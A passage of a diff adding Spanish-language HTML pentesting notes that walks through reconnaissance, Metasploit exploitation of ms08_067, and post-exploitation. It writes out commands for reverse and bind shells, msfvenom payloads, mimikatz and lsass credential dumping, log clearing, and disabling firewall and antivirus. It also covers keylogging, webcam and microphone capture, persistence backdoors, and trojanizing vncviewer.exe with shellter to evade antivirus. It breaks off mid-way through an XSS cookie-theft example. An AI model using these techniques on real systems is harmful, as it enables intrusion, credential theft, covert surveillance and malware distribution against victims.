+<span class="o">[</span>*<span class="o">]</span> <span class="o">[</span>host<span class="o">]</span> mail1.udemy.com <span class="o">(</span><span class="m">104</span>.16.91.52<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> <span class="o">[</span>host<span class="o">]</span> server1.udemy.com <span class="o">(</span><span class="m">104</span>.16.91.52<span class="o">)</span>
+...
+</code></pre></div>
+
+<p>theharvester</p>
+<div class="codehilite"><pre><span></span><code>python theHarvester.py -d udemy.com -l <span class="m">500</span> -b google
+</code></pre></div>
+
+<h5 id="extraccion-metadatos">Extracción metadatos</h5>
+<p><code>foca</code>  es un programa de windows para extraer los metadatos de archivos, a su vez si insertas un dominio busca todos los archivos públicos en ese dominio y los analiza.</p>
+<h3 id="enumeracion">Enumeración</h3>
+<p>Una vez ya hemos recolectado toda la información de la organización, queda verificar que dispositivos están activos en los rangos y extraer versiones de servicios o sistemas operativos.</p>
+<p>De forma pasiva existen diferentes aplicaciones muy útiles.</p>
+<p><code>shodan</code> dados unos patrones de búsqueda extrae datos sobre servicios, sistemas o puertos, entre otras.</p>
+<div class="codehilite"><pre><span></span><code>apache country:es
+net:150.224.0.0/16
+port:80
+title:portal
+org:<span class="s2">&quot;Universidad autonoma de madrid&quot;</span>
+</code></pre></div>
+
+<p><code>zoomeye</code> es muy similar a shodan.</p>
+<p><code>censys</code> es similar a las anteriores con la opción de buscar por tipo certificado.</p>
+<p>De forma  activa, tenemos las siguientes opciones:</p>
+<p><strong>nmap</strong> </p>
+<p>puede extraer puertos abiertos, sistema operativo o versión del servicio. ( es un poco lento )</p>
+<div class="codehilite"><pre><span></span><code>nmap -Pn <span class="m">10</span>.1.1.0/24    <span class="c1"># forzar escaneo todos los dispositivos</span>
+-sT     <span class="c1"># servicios tcp</span>
+-sU     <span class="c1"># servicios udp</span>
+-p <span class="m">443</span>,80   <span class="c1"># puertos</span>
+-p- <span class="c1"># todos los puertos</span>
+-n  <span class="c1"># no hacer resolucion dns</span>
+-T1  -T5    <span class="c1"># t1 escaneo lento t5 rapido</span>
+--top-ports<span class="o">=</span><span class="m">10</span> --open   <span class="c1"># buscar top 10 puertos y mostrar solo abiertos</span>
+-iL fichero-de-ips
+-sV     <span class="c1"># version servicio</span>
+-O      <span class="c1"># version de sistema operativo</span>
+-sC     <span class="c1"># lanzar scripts para interactuar con puertos</span>
+-A      <span class="c1"># equivale a (-sV -sC -O tracerouter)</span>
+</code></pre></div>
+
+<p><strong>netcat/nc</strong> </p>
+<p>Examina los puertos abiertos  rápidamente.</p>
+<div class="codehilite"><pre><span></span><code> nc -zvn <span class="m">192</span>.168.88.4 <span class="m">22</span>-80 
+ -z <span class="c1"># escanea y lista servicios</span>
+ -v  <span class="c1"># vervose</span>
+ -n <span class="c1"># no hacer resoluciones dns</span>
+</code></pre></div>
+
+<p><strong>mediante dns</strong> </p>
+<p>podemos extraer datos de los dns mal configurados con las siguientes herramientas.</p>
+<p>Pedir al dns que haga una transferencia de zona y nos envíe todos sus datos, est solo funcionara si esta mal configurado.</p>
+<div class="codehilite"><pre><span></span><code>host -t axfr udemy.com
+dig axfr @SERVIDOR.DNS  udemy.com
+</code></pre></div>
+
+<p>Extraer datos el dns</p>
+<div class="codehilite"><pre><span></span><code>dnsenum -enum udemy.com
+dnsenum -s <span class="m">5</span> -p <span class="m">5</span> udemy.com
+
+dnsrecon -ad udemy.com
+<span class="c1"># intntar extraer subdominios</span>
+dnsrecon -d udemy.com -t <span class="o">[</span>crt,goo,bing,axfr...<span class="o">]</span>
+dnsrecon -d escoladeltreball.org -D /home/debian/dicionario -t brt
+
+fierce -dns udemy.com
+</code></pre></div>
+
+<h3 id="analisis">Análisis</h3>
+<p>En el análisis nos dedicaremos a detectar las vulnerabilidades y explotarlas para intentar obtener el control del sistema.</p>
+<p>dos páginas muy utilizadas donde encontrar diferentes tipos de exploits son https://www.exploit-db.com , https://www.securityfocus.com . </p>
+<h4 id="deteccion-vulnerabilidades">Detección vulnerabilidades</h4>
+<p>Se pueden detectar vulnerabilidades de forma manual o automática,  si tenemos un gran número de dispositivos la forma manual es inviable, pero si solo queremos explotar un servicio es una opción. </p>
+<p>las aplicaciones mas conocidas para la detección de vulnerabilidades son: <a href="https://es-la.tenable.com/products/nessus">nessus</a> , http://www.openvas.org/ . </p>
+<p>detectar versión de smb y sus características:</p>
+<div class="codehilite"><pre><span></span><code>nmap -p445 -T4 -sT   -A  <span class="m">10</span>.0.0.1
+enum4linux  -t <span class="m">10</span>.0.0.1
+</code></pre></div>
+
+<h4 id="tipologia-de-exploits">Tipología de exploits</h4>
+<p>Cuando hablamos de un exploit nos referimos al software que permite tomar cierta ventaja de una vulnerabilidad ya sea para acceder al sistema,  elevar privilegios, realizar denegación de servicios, etc...</p>
+<p><strong>Exploits remotos:</strong> Son aquellos que se lanzan de forma remota a aquellos dispositivos que se tiene visibilidad.</p>
+<p><strong>Exploits locales:</strong> son aquellos que se lanzan una vez ya estas dentro del sistema, normalmente para elevar privilegios.</p>
+<p><strong>Exploits del lado del cliente:</strong> Son los que se lanzan normalmente a una plataforma web y afectara a los clientes que se conecten a dicha plataforma.</p>
+<h4 id="tipos-de-conexion">Tipos de conexión</h4>
+<h5 id="conexion-directa">Conexión directa</h5>
+<p>En la conexión directa  accedes estableces un túnel desde el host atacante al vulnerable, el vulnerable tendrá un puerto abierto en escucha y conectaremos contra él. Este tipo de conexiones es posible que fallen ya que en el firewall se acede desde fuera hacia adentro y si esta bien configurado lo filtrara.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">#  host vulnerable abre puerto de escucha</span>
+nc -lvvp <span class="m">1234</span> -e /bin/bash
+<span class="c1"># atacante se conecta a puerto conocido</span>
+nc  <span class="m">10</span>.0.0.5 <span class="m">1234</span>
+~# _
+</code></pre></div>
+
+<h5 id="conexion-inversa">Conexión inversa</h5>
+<p>En esta conexión lo que se crea un túnel que sale del host vulnerable al host atacante, de esta forma en la gran mayoría de firewalls no lo filtraran. El modo de uso es el atacante abre un puerto a la escucha y el vulnerable mediante un exploit se conectara al atacante.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># atacante abre su puerto</span>
+nc -lvvp <span class="m">1234</span>
+<span class="c1"># vulnerable se conecta al atacante </span>
+nc <span class="m">10</span>.0.0.6 -e /bin/bash
+</code></pre></div>
+
+<h4 id="metasploit">Metasploit</h4>
+<p>Metasploit es una herramienta que facilita mucho la hora de explotar una vulnerabilidad, básicamente trabaja con una base de datos donde se encuentran todos sus exploits y luego ejecuta un payload, que sería la acción que quieres hacer al haber accedido al sistema. también tiene la aplicación <em>artimage</em> que seria su equivalente gráfica, aun que tiene un rendimiento menor.</p>
+<p>Toda la información de metasploit se encuentra en <code>/usr/share/metasploid-framework/</code>  y dentro de <code>modules/exploits/</code> se encuentran todos los exploits que utiliza, si quisiéramos añadir alguno, solo tendríamos que copiarlo en este directorio.</p>
+<p>Al iniciar metasploit lo primero que tenemos que comprobar es que la base de datos esta bien conectada.</p>
+<div class="codehilite"><pre><span></span><code>msfconsole  <span class="c1">#  iniciar metasploit</span>
+msf&gt; search ms08    <span class="c1"># hacer busqueda en bd</span>
+<span class="c1"># en el caso de no tener BDatos</span>
+msf&gt; <span class="nb">exit</span>
+msfdb init
+<span class="c1"># volver aentrar y comprobar</span>
+msfconsole
+msf&gt; db_status
+msf&gt; db_rebuild_cache
+</code></pre></div>
+
+<h5 id="workspaces">workspaces</h5>
+<p>Para  organizarnos en caso de hacer varias tareas a la vez usaremos diferentes espacios de trabajo.</p>
+<div class="codehilite"><pre><span></span><code>workspace -h  <span class="c1"># help</span>
+workspace -a udemy <span class="c1"># crear spacio udemy</span>
+workspace -d udemy  <span class="c1"># eliminar udemy</span>
+workspace udemy     <span class="c1"># entrar en espacio udemy</span>
+workspace   <span class="c1"># ver espacios disponibles</span>
+</code></pre></div>
+
+<h5 id="exploit">Exploit</h5>
+<p>con el exploit lo que hacemos es atacar la vulnerabilidad.</p>
+<div class="codehilite"><pre><span></span><code>search ms08 <span class="c1"># buscar la vulnerabilidad que queremos</span>
+use exploit/windows/smb/ms08_067_netapi <span class="c1"># cargarla</span>
+show info   <span class="c1"># ver información</span>
+show options <span class="c1"># ver opciones de parametros requeridos</span>
+<span class="nb">set</span> <span class="c1"># añadir parameros </span>
+</code></pre></div>
+
+<p>Por cada exploit en la página https://www.rapid7.com/db esta un pequeño manual de uso, esta página es de los mismos creadores de metasploit y se actualiza periódicamente.</p>
+<h5 id="payloads">Payloads</h5>
+<p>Son las acciones a realizar justa al haber ejecutado el exploit.</p>
+<p>Ejemplos de payloads:</p>
+<div class="codehilite"><pre><span></span><code>windows/adduser     <span class="c1"># creación de usuarios</span>
+windows/vncinject/reverse_tcp   <span class="c1"># conexión vnc</span>
+windows/shell/reverse_tcp   <span class="c1"># tunel inverso</span>
+</code></pre></div>
+
+<p>Estas payloads también tienen sus opciones de parámetro y se tendrán que añadir con <code>set</code></p>
+<h5 id="explotar-vulnerabilidad">Explotar vulnerabilidad</h5>
+<p>Para explotar una vulnerabilidad hay que cargar un exploit y un payload y añadir sus parametros requeridos.</p>
+<p>en este caso explotaremos una vulnerabilidad de los dispositivos windows xp,2003 de smb.</p>
+<div class="codehilite"><pre><span></span><code>msfconsole
+workspace udemy     <span class="c1"># acceder al spacio de trabajo elejido</span>
+search exploid ms08 <span class="c1"># buscar el exploid que queremos</span>
+use exploit/windows/smb/ms08_067_netapi <span class="c1"># cargarlo</span>
+show options    <span class="c1"># ver opciones requeridas</span>
+<span class="nb">set</span> rhost <span class="m">10</span>.0.0.10     <span class="c1"># añadir remote host requerido</span>
+<span class="nb">set</span> payload windows/meterpreter/reverse_tcp <span class="c1"># cargar payload de tunel inverso</span>
+show options    <span class="c1"># ver opciones requeridas</span>
+<span class="nb">set</span> lhost <span class="m">10</span>.0.0.5  <span class="c1"># añadir local host requerido</span>
+exploit <span class="c1"># ejecutar ordenes</span>
+meterpreter &gt;_  <span class="c1"># si todo a ido bien nos debuelve una shell en la victima</span>
+</code></pre></div>
+
+<h5 id="background">Background</h5>
+<p>Una vez conectado en un host interactivamente tendremos una terminal, y si queremos seguir con otras cosas podemos echar mano al background, que llega a ser tener diferentes sesiones de metasploit.</p>
+<div class="codehilite"><pre><span></span><code>metasploit@maquina-remota&gt; background  <span class="c1"># o también Ctrl+Z   dejar en segundo plano</span>
+msf&gt; sessions   <span class="c1"># ver sesiones abiertas</span>
+ms&gt; session -i <span class="m">5</span>    <span class="c1"># acceder a la session 5</span>
+</code></pre></div>
+
+<h5 id="importar-datos-de-nmap">Importar datos de nmap</h5>
+<p>Es posible que si tenemos datos de nmap previos importarlos y así trabajar con ellos desde metasploit</p>
+<div class="codehilite"><pre><span></span><code>nmap <span class="m">10</span>.0.0.5 -A -Pn -n -oX pruevas-windows.xml <span class="c1"># ejecutar nmap dejando datos en salida xml</span>
+msfconsole  <span class="c1"># entrar en metasploit</span>
+msf&gt; db_import /root/escaneos/pruevas-windows.xml <span class="c1"># importar archivo</span>
+msf&gt; hosts  <span class="c1"># datos de hosts</span>
+msf&gt; services <span class="c1"># datos de servicios</span>
+
+<span class="c1"># se puede ejecutar directamente nmap desde metasploit también</span>
+msf&gt; db_nmap -A <span class="m">10</span>.0.0.5
+</code></pre></div>
+
+<p><strong>filtrado</strong>  </p>
+<div class="codehilite"><pre><span></span><code>hosts -c column,columna -S filtrado
+services -c columna,columna  <span class="m">10</span>.0.0.5
+services -p <span class="m">445</span>
+</code></pre></div>
+
+<h5 id="anadir-modulos">Añadir módulos</h5>
+<div class="codehilite"><pre><span></span><code>mkdir /usr/share/metasploid-framework/modules/exploits/test
+<span class="c1"># o si lo quieres solo para un usuario</span>
+mkdir -p ~/.msf4/modules/exploits/test
+<span class="c1"># añdir el modulo dentro de test</span>
+cp test-module.rb  /usr/share/metasploid-framework/modules/exploits/test/
+
+<span class="c1"># recargar modulos en metasploit</span>
+msf&gt; reload_all
+msf&gt; use exploits/test/test-module
+</code></pre></div>
+
+<h5 id="generar-archivo-con-payload">Generar archivo con payload</h5>
+<div class="codehilite"><pre><span></span><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span><span class="m">10</span>.1.1.22 <span class="nv">lport</span><span class="o">=</span><span class="m">4445</span> -e x86/shikata_ga_nai  -i <span class="m">3</span> -f exe -o test.exe
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>msfconsole
+use exploit/multi/handler
+<span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+show options
+<span class="nb">set</span> lhost <span class="m">10</span>.1.1.22
+<span class="nb">set</span> lport <span class="m">4445</span>
+exploit
+</code></pre></div>
+
+<h3 id="post-explotacion">Post-explotación</h3>
+<p>En la post-explotación ya estamos dentro del sistema vulnerable y este paso las tareas son: elevar privilegios, analizar comportamiento del usuario, análisis tráfico red, abrir puertas traseras, acceder a otras redes.</p>
+<h4 id="extraer-informacion-del-sistema">Extraer información del sistema</h4>
+<p>siempre desde la terminal de <code>metasploit&gt;</code></p>
+<div class="codehilite"><pre><span></span><code><span class="nb">help</span>
+use -l
+sysinfo
+getuid <span class="c1"># usuario corriendo</span>
+getpid <span class="c1"># pid corriendo</span>
+ps      <span class="c1"># procesos</span>
+migrate <span class="m">368</span> <span class="c1"># cambiar a proceso 368</span>
+run checkvm <span class="c1"># verificar si es una maquina virtual</span>
+run get_env <span class="c1"># ver variables de entorno</span>
+run get_application_list  <span class="c1"># ver aplicaciones instaladas</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>run scraper <span class="c1">#  exportar información del sistema</span>
+run winenum <span class="c1"># lo mismo con mas datos</span>
+~/.msf4/logs/scripts/scraper
+</code></pre></div>
+
+<blockquote>
+<p>estos dos comandos exportan datos a la máquina local, por lo tanto hacen mucho ruido</p>
+</blockquote>
+<h4 id="elevar-privilegios">Elevar privilegios</h4>
+<div class="codehilite"><pre><span></span><code>getuid <span class="c1"># ver privilegios actuales</span>
+getsystem -h
+getsystem <span class="c1"># levar privilegios a system</span>
+getuid
+rev2self  <span class="c1"># volver a privilegios anteriores</span>
+
+hashdump <span class="c1"># ver credenciales usuarios, equivale a /etc/passwd</span>
+</code></pre></div>
+
+<p>Para que metasploit pese menos, no carga todas las librerías por defecto. Podemos cargar las opcionales a medida que las necesitamos.</p>
+<div class="codehilite"><pre><span></span><code>use mimikatz <span class="c1"># cargar libreria mimikatz</span>
+wdigest <span class="c1"># ver credenciales</span>
+
+use kiwi <span class="c1"># cargar libreria kiwi </span>
+creds_all <span class="c1"># ver credenciales</span>
+</code></pre></div>
+
+<h4 id="eliminar-rastros-y-sistemas-de-seguridad">Eliminar rastros y sistemas de seguridad</h4>
+<div class="codehilite"><pre><span></span><code>clearev  <span class="c1"># borrar visor de eventos</span>
+
+shell <span class="c1"># acceder a la shell del sistema</span>
+<span class="c1"># desactivar firewall</span>
+netsh show opmode
+netsh firewall <span class="nb">set</span> opmode <span class="nv">mode</span> <span class="o">=</span> disable <span class="nv">profiles</span> <span class="o">=</span> all
+
+run killav <span class="c1">#desactivar antivirus</span>
+</code></pre></div>
+
+<h4 id="espionaje">Espionaje</h4>
+<div class="codehilite"><pre><span></span><code>keyscan_start <span class="c1"># espiar movimiento de teclado</span>
+keyscan_dump  <span class="c1"># exportar movimientos</span>
+keyscan_stop
+
+screenshot  <span class="c1"># extraer sccreenshot del sistema </span>
+run vnc <span class="c1"># abrir ventana vnc</span>
+
+record_mic <span class="m">10</span>   <span class="c1"># grabar micro 10 segundos</span>
+webcam_list
+webcam_snap <span class="m">1</span>   <span class="c1"># extraer foto de camara 1</span>
+webcam_stream   <span class="c1"># extraer video en directo</span>
+webcam_chat     <span class="c1"># abrir chat</span>
+</code></pre></div>
+
+<h4 id="snifer">Snifer</h4>
+<div class="codehilite"><pre><span></span><code>use sniffer
+sniffer_interfaces
+sniffer_start <span class="m">1</span> <span class="m">1024</span> <span class="c1"># numero de interfaz y buffer</span>
+sniffer_dump <span class="m">1</span> pruebas.pcap
+sniffer_stop <span class="m">1</span>
+</code></pre></div>
+
+<h4 id="backdoor">Backdoor</h4>
+<div class="codehilite"><pre><span></span><code>run persistence -h
+run persistence -A -L c:<span class="se">\\</span>temp<span class="se">\\</span> -X -i <span class="m">3600</span> -p <span class="m">4443</span> -r <span class="m">10</span>.1.1.22
+<span class="c1"># si a ido bien devolvera datos de lo que hace incluido donde aloja los scripts</span>
+
+<span class="c1"># para dejar que conecte automaticamente</span>
+resource  ~/.msf4/persistence/.../...rc
+<span class="c1"># esto lo que hace es borrar los archivos del persistence</span>
+</code></pre></div>
+
+<ul>
+<li>
+<p><code>-A</code> ejecutar al arrancar</p>
+</li>
+<li>
+<p><code>-L</code> localización del payload</p>
+</li>
+<li>
+<p><code>-X</code> conectar en el boot de windows</p>
+</li>
+<li>
+<p><code>-i</code> periodo de reintento en segundos</p>
+</li>
+</ul>
+<p>Una vez que esta lanzado el persistence en la máquina vulnerable, tenemos que abrir nuestro puerto para que se conecte.</p>
+<div class="codehilite"><pre><span></span><code>use exploit/multi/handler
+<span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+show options
+<span class="nb">set</span> lhost <span class="m">10</span>.1.1.22
+<span class="nb">set</span> lport <span class="m">4443</span>
+exploit
+</code></pre></div>
+
+<h4 id="pivoting">Pivoting</h4>
+<div class="codehilite"><pre><span></span><code>ipconfig
+background
+
+route add <span class="m">10</span>.1.2.0/24  <span class="m">1</span> <span class="c1"># el 1 es el numero de sesion</span>
+route
+</code></pre></div>
+
+<h4 id="conectar-de-windows-a-windows">Conectar de windows a windows</h4>
+<p>En el caso que queramos acceder desde un host windows a otro windows remotamente desde linea de terminal, es posible con <code>psexec</code>. Este se encuentra entre los ejecutables de <code>pstools</code> que podemos encontrar en las herramientas de windows.</p>
+<p>https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># programa  ip-destino      dominio\usuario  contraseña   que-ejecutar</span>
+psexec.exe  <span class="se">\\</span><span class="m">10</span>.1.1.13     -u WIN7<span class="se">\p</span>edro   -p pedro123     cmd.exe
+</code></pre></div>
+
+<ul>
+<li>El problema de esta opción es que tenemos que tener todos los datos.</li>
+</ul>
+<h4 id="de-shell-a-meterpreter">De shell a meterpreter</h4>
+<p>Si por la razón que sea solo hemos podido acceder a un dispositivo windows desde una shell y queremos  utilizar las utilidades de meterpreter, tenemos una posible solución.</p>
+<div class="codehilite"><pre><span></span><code>use exploit/windows/smb/psexec
+<span class="nb">set</span> payload windows/shell/reverse_tcp
+<span class="nb">set</span> .... <span class="c1"># añadir opcione requeridas</span>
+exploit
+C:&gt; Ctl+Z   <span class="c1"># dejar sesion en 2º plano</span>
+
+use post/multi/manage/shell_to_meterpreter
+<span class="nb">set</span> lhost ...
+<span class="nb">set</span> session ...
+run
+
+sessions <span class="c1"># ver sesiones activas, ( se habra creado ua nueva )</span>
+sessions  -i ...    <span class="c1"># entrar en sesion nueva</span>
+</code></pre></div>
+
+<blockquote>
+<p>Donde añado <code>...</code>  introducir el argumento por el payload o comando.</p>
+</blockquote>
+<h4 id="extraer-credenciales">Extraer credenciales</h4>
+<p>Desde windows tenemos el programa mimikatz que entre otras cosas, nos permite extraer las credenciales de los usuarios con un sesión abierta, ya que mimikatz las extra los datos temporales cargados en ram.</p>
+<p>descargar mimikats: https://github.com/gentilkiwi/mimikatz/releases</p>
+<p>ejecutar el archivo exe con permisos de administrador de la arquitectura de vuestro sistema operativo. </p>
+<div class="codehilite"><pre><span></span><code>mimikatz.exe
+privilege::debug    <span class="c1"># comprobar privilegios </span>
+sekurlsa::logonpasswords <span class="c1"># extraer credenciales ram</span>
+</code></pre></div>
+
+<p>Bien ahora combinando <code>psexec</code> y <code>mimikatz</code>  podríamos llegar a extraer los datos de la cuenta admin de un host remoto desde un usuario sin privilegios.</p>
+<div class="codehilite"><pre><span></span><code>psexec.exe  <span class="se">\\</span><span class="m">10</span>.1.1.13 -u WIN7<span class="se">\p</span>edro  -p pedro123 -c mimikatz privilege::debug sakurlsa::logonpasswords <span class="nb">exit</span> &gt; crecenciales.txt
+</code></pre></div>
+
+<h5 id="ophcrack">Ophcrack</h5>
+<p>Es un programa tanto instalable como portable que extrae los hash el sistema y tiene la posibilidad de crackear mediante fuerza bruta los hashes.</p>
+<h5 id="procdump">Procdump</h5>
+<p>Es otro programa de windows para extraer hash del sistema, este los extrae en un formato <code>.dmp</code> para posteriormente descifrarlo con mimikatz u otros.</p>
+<p>Los archivos que utiliza para esta extracción son <code>windows/system/config/{sam,system}</code>   </p>
+<div class="codehilite"><pre><span></span><code>procdump.exe -na lsass.exe lsassdump -accepteula
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>mimikatz.exe
+sekurlsa::minidump lsassdump.dmp
+sekurlsa::logonpasswords
+</code></pre></div>
+
+<h5 id="unshadowjohn">unshadow/john</h5>
+<p>Estos son 2 comandos de linux donde juntan los usuarios con sus contraseñas cifradas en un archivo, para posteriormente descifrarlas mediante fuerza bruta.</p>
+<div class="codehilite"><pre><span></span><code>unshadow /etc/passwd /etc/shadow &gt; hash-unix
+john hash-unix
+</code></pre></div>
+
+<h5 id="fuerza-bruta">Fuerza bruta</h5>
+<p>Esta la posibilidad de utilizar fuerza bruta para resolver contraseñas, hay diferentes métodos:</p>
+<ul>
+<li>profundidad: 1 usuario muchas contraseñas </li>
+<li>anchura: muchos usuarios y una contraseña</li>
+<li>profundidad/anchura:  muchos usuarios y muchas contraseñas.</li>
+</ul>
+<p>Estos procesos son muy lentos y en según que casos el servicio puede bloquearnos por el uso excesivo de pruebas, en todo caso este método hace uso de diccionarios, es decir una lista muy grande de  posibilidades e ir probando hasta que alguna coincida.</p>
+<div class="codehilite"><pre><span></span><code>hydra -L users -p Soc123 -vV <span class="m">10</span>.1.1.5 smb <span class="c1"># diccionario de usuarios a 1 contraseña</span>
+hydra -l soc -P paswords -vV <span class="m">10</span>.1.1.5 smb   <span class="c1"># diccionario de passwords a 1 usuaro</span>
+hydra -L users -P paswords -vV <span class="m">10</span>.1.1.5 smb <span class="c1"># diccionario de users y passwords</span>
+</code></pre></div>
+
+<p>Módulos de medusa <code>/usr/lib/medusa/modules</code> </p>
+<div class="codehilite"><pre><span></span><code>medusa -u soc -p soc1234 -h <span class="m">10</span>.0.0.5 -M smb
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>ncrack -p <span class="m">445</span>  --user soc --pass soc123 <span class="m">10</span>.0.0.5
+ncrack -p <span class="m">445</span>  -U users --pass soc123 <span class="m">10</span>.0.0.5
+</code></pre></div>
+
+<h4 id="evadir-antivirus">Evadir antivirus</h4>
+<p>Podemos ver si un archivo se detecta como malicioso para los antivirus  con  diversas aplicaciones como <a href="https://www.virustotal.com/gui/home/upload">virustotal</a> o <a href="https://nodistribute.com">nodistribute</a> , esto nos puede interesar a la hora de crear un ejecutable malicioso subirlo primero a una de estas aplicaciones,  comprobar su efectividad y distribuirlo si fuera necesario.</p>
+<p>Hay que decir que virustotal tiene una base de datos de antivirus más grande, pero reporta a las empresa los virus detectados, así que según que quieras hacer es mejor no subirlo en dicha página. </p>
+<p>Con <code>msfvenom</code> podemos crear ejecutables maliciosos, el inconveniente es que casi todos los antivirus  lo detectan.</p>
+<div class="codehilite"><pre><span></span><code>msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.5 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe &gt; /tmp/shell.exe
+</code></pre></div>
+
+<h5 id="veil-evasion">veil-evasion</h5>
+<p>Proporciona payloads con cripters, es decir aporta diferentes payloads con diferentes capas de encriptado para que los antivirus le cueste detectar que es un ejecutable malicioso.</p>
+<p><strong>instalar</strong> </p>
+<p><u>dependencias:</u></p>
+<p>Install Python 2.7, Py2Exe, PyCrypto, and PyWin32 on a Windows computer (for Py2Exe).</p>
+<p><u>instalación:</u></p>
+<div class="codehilite"><pre><span></span><code>apt-get -y install git
+git clone https://github.com/Veil-Framework/Veil-Evasion.git
+<span class="nb">cd</span> Veil-Evasion/
+<span class="nb">cd</span> setup
+setup.sh -s 
+</code></pre></div>
+
+<p><u>método de uso:</u></p>
+<div class="codehilite"><pre><span></span><code>python vail-evasion.py
+list    <span class="c1"># listar payloads</span>
+use <span class="m">47</span>  <span class="c1"># utilizar payload 47</span>
+<span class="nb">set</span> lhost <span class="m">10</span>.0.0.5  <span class="c1"># añadir opción requerida </span>
+generate    <span class="c1"># generar exe</span>
+</code></pre></div>
+
+<h5 id="shellter">shellter</h5>
+<p>Shellter es de las mejores opciones enmascarando un ejecutable malicioso, ya que permite introducir un ejecutable dentro de otro, por lo tanto el usuario abrirá el ejecutable interactuará con el programa principal, y en segundo plano nuestro ejecutable interno se ejecutara en segundo plano.</p>
+<p>directorio de producción <code>/usr/share/shellter</code></p>
+<p>directorio donde encontramos los binarios de windows <code>/usr/share/windows-binaries/</code> </p>
+<p>En el siguiente ejemplo introducimos un <code>reverse_tcp</code>  en un ejecutable <code>vnc</code>.</p>
+<div class="codehilite"><pre><span></span><code>apt install shellter
+
+<span class="nb">cd</span> /usr/share/shellter
+cp /usr/share/windows-binaries/vncviewer.exe ./
+
+shellter <span class="c1"># abrir shelter</span>
+vncviewer.exe <span class="c1"># binario a utilizar</span>
+Enable Stealth Mode? <span class="c1"># habilitar que se ejecute el payload en segundo plano</span>
+Y
+Use a listed payload or custom? <span class="c1"># utilizare un payload de la lista</span>
+L
+<span class="k">select</span> payload by index: <span class="c1"># el Meterpreter_reverse_TCP en lalista es el 1</span>
+<span class="m">1</span>
+<span class="nb">set</span> lhost <span class="m">10</span>.0.0.7 <span class="c1"># donde se va a conectar</span>
+<span class="nb">set</span> lport <span class="m">8888</span> <span class="c1"># por que puerto</span>
+<span class="c1"># ya podemos recoger nuestro archivo vncviewer.exe modificado del directorio actual.</span>
+</code></pre></div>
+
+<p><strong>Usarlo:</strong></p>
+<p>abrir puerto en linux</p>
+<div class="codehilite"><pre><span></span><code>msfconsole
+use exploit/multi/handler
+<span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+<span class="nb">set</span> lhost <span class="m">10</span>.0.0.7
+<span class="nb">set</span> lport <span class="m">8888</span>
+exploit
+</code></pre></div>
+
+<p>ejecutar en un windows el vmviewer.exe que hemos modificado y se conectara automáticamente al linux en la consola del meterpreter.</p>
+<h4 id="evadir-autenticacion">Evadir autenticación</h4>
+<p>Existen diferentes formas de evadir la autenticación de sistemas operativos.</p>
+<p>Una buena manera  en windows es con el programa <code>kon-bootcd</code> que es una iso booteable y ella sola se encarga de todo.</p>
+<p>https://archive.org/details/Kon-bootForCD</p>
+<p>También están otros métodos como DLC, Hirens y otros</p>
+<p>Desde linux siempre esta la opción de arrancar en modo emergency siempre y cuando el grub te lo permita.</p>
+<h2 id="vulnerabilidades-en-aplicaciones-web">vulnerabilidades en aplicaciones web</h2>
+<h3 id="metodologia_1">Metodología</h3>
+<ul>
+<li>Mapeo y análisis de la aplicación</li>
+<li>
+<p>Analizar toda la aplicación, detectar contenido oculto, identificar funcionalidades como put delete, identificar que tecnologías utiliza.</p>
+</li>
+<li>
+<p>Pruebas en los controles del cliente</p>
+</li>
+<li>
+<p>Pruebas en el mecanismo de autenticación</p>
+</li>
+<li>
+<p>Analizar el proceso de autenticación, enumerar usuarios, funcionalidad recordar credenciales.</p>
+</li>
+<li>
+<p>Pruebas en el manejo de sesiones</p>
+</li>
+<li>
+<p>Analizar la sesión que se crea, como y cuanto tarda, verificación de tokens y cookies, fijación de sesiones, <em>cross-site request fotgety</em> enlace malicioso que cambia credenciales de usuario etc..</p>
+</li>
+<li>
+<p>Pruebas en el control de autorización</p>
+</li>
+<li>
+<p>Elevación privilegios vertical de user a admin etc.. o lateral de user1 a user2.</p>
+</li>
+<li>
+<p>Pruebas en la lógica de la aplicación</p>
+</li>
+<li>Pensar en algo que el desarrollador no aya pensado para modificar la web</li>
+</ul>
+<h3 id="ataques-conocidos">Ataques conocidos</h3>
+<p><a href="https://www.owasp.org/index.php/Main_Page">owasp</a> es un proyecto que facilita las auditorias en aplicaciones web, su propia web te facilita diferentes aplicaciones para auditar como para entrenar tus conocimientos.</p>
+<p><a href="https://pentesterlab.com/">pentesterlab</a> es otra web donde practicar y encontrar recursos para auditorias.</p>
+<h4 id="herramientas">Herramientas</h4>
+<p><a href="https://www.owasp.org/index.php/OWASP_Mantra_-_Security_Framework">mantra</a>  es un navegador tuneado donde encuentras una serie de plugins muy útiles para la auditoria web.</p>
+<p><a href="https://portswigger.net/burp">burpsuit</a> , <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">zap proxy</a>,: Son proxys de intercepción de peticiones, con ellos podrás interceptar una petición , modificarla para luego mandarla con con las modificaciones asignadas.</p>
+<p><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project/es">dirbuster</a> fuerza bruta a contenido oculto de una web</p>
+<h4 id="xss">xss</h4>
+<p>xss es un tipo de vulnerabilidad donde una aplicación web te permite ejecutar código en un cuadro de texto. Este vulnerabilidad es muy utilizada en aplicaciones como facebook, etc.. para extraer credenciales. Se manda un enlace con el código camuflado para que la victima clique y sin enterarse haga una acción en segundo plano.</p>
+<p><u>por ejemplo:</u></p>
+<p>En el siguiente ejemplo se ejecutara código en un cuadro de texto para extraer las cookies de un usuario y mandárselas remotamente a otro.</p>
+<p>crear una web que ejecute php y insertar este archivo para recibir las cookies mediante url y  almacenarlas en cookies_list.txt</p>
+<p>cookies.php</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
